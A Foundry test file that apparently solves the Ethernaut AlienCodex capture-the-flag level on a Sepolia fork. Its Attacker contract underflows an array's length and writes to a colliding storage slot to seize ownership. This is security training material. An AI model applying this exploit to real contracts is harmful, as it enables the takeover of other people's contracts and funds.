// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface AlienCodex{
    function owner() external view returns (address);
    function makeContact() external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}

contract Attacker{
    constructor(AlienCodex alienCodex, address newOwner){

        alienCodex.makeContact();
        // the makes the array length to be uint.max, allowing us to set value at arbitrary storage
        alienCodex.retract();

        // We want to find out which array idx has storage index collides with the owner storage index in AlienCodex
        // For array, the storage index = keccak256(slot_index_in_the_contract) + idx * word_size_of_array_element
        uint slot = 1;
        uint idx = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - (uint256(keccak256(abi.encodePacked((slot)))) + 1 * 1) + 2;
        uint target = uint(uint160(newOwner)) | 0xffffffffffffffffffffffff0000000000000000000000000000000000000000;
        alienCodex.revise(idx, bytes32(target));

    }
}

contract AlienCodexTest is Test {
    AlienCodex alienCodex;
    function setUp() public{
        vm.createSelectFork("sepolia", 5440008);
        alienCodex = AlienCodex(0x1Ae7E2F2a6177403E484e4F6A71605f70e26D5Bd);
    }
    function test_aliencodex() public{
        address currOwner = alienCodex.owner();
        Attacker attacker = new Attacker(alienCodex, msg.sender);
        address newOwner = alienCodex.owner();
        require(currOwner != newOwner, "Change owner failed");
    }
}
